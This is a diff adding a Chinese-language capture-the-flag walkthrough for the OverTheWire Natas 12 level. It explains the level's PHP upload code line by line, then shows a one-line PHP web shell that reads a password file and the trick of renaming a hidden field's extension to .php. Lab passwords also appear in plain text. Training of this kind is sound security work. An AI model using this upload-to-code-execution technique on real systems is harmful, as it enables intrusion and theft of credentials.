@@ -195,10 +195,64 @@ graph TD;
 > - Username: natas12
 > - Password: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB
 
+1. 打開題目後會看到可以查看原始 PHP 程式碼，以下提供附上程式碼並逐行註解說明程式。
+    ```php
+    <?php
+    
+    function genRandomString() {    // 製作一個隨機的亂碼字串
+        $length = 10;
+        $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
+        $string = "";
+    
+        for ($p = 0; $p < $length; $p++) {
+            $string .= $characters[mt_rand(0, strlen($characters)-1)];
+        }
+    
+        return $string;
+    }
+    
+    function makeRandomPath($dir, $ext) {    // 重製檔名
+        do {
+        $path = $dir."/".genRandomString().".".$ext;
+        } while(file_exists($path));
+        return $path;
+    }
+    
+    function makeRandomPathFromFilename($dir, $fn) {    // 獲取隱藏輸入框之內容並取得副檔名後，呼叫製作隨機檔名
+        $ext = pathinfo($fn, PATHINFO_EXTENSION);
+        return makeRandomPath($dir, $ext);
+    }
+    
+    if(array_key_exists("filename", $_POST)) {
+        $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);    // 設定 target_path 變數為呼叫 makeRandomPathFromFilename 函式並帶入兩個值回傳之值，帶入之兩參數分別為 "upload" 字串與一個隱藏在前端網頁中的輸入框內容。
+    
+    
+            if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {    // 判斷檔案是否超過 1 KB。
+            echo "File is too big";    // 檔案若超過 1 KB 則回傳「File is too big」。
+        } else {    // 若檔案小於 1 KB，則上傳並回傳檔案上傳路徑。
+            if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {    // 上傳檔案至 target_path 變數之路徑
+                echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";    // 回傳檔案上傳之位置
+            } else{
+                echo "There was an error uploading the file, please try again!";    // 若上傳錯誤則回傳「There was an error uploading the file, please try again!」
+            }
+        }
+    } else {
+    ?>
+    ```
+2. 由上述程式碼猜測為檔案上傳漏洞。
+3. 於是先製作一個 PHP 檔，其內容如下，以進行 RCE 獲取密碼。
+    ```php
+    <?php
+        echo system("cat /etc/natas_webpass/natas13");
+    ?>
+    ```
+4. 為使其儲存成 PHP 檔，隱藏透過點擊鍵盤 F12 打開開發者工具，並將一個名為 `filename` 隱藏輸入框的值副檔名修改成 `.php`。
+5. 接著上傳第三步製作的 PHP 檔後，網站回傳檔案上傳之路徑，將其打開後就看到 NATAS 13 的密碼了。
+
 ## [NATAS 13](http://natas13.natas.labs.overthewire.org)
 > - Link: http://natas13.natas.labs.overthewire.org
 > - Username: natas13
-> - Password: lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9
+> - Password: trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
 
 ## [NATAS 14](http://natas14.natas.labs.overthewire.org)
 > - Link: http://natas14.natas.labs.overthewire.org
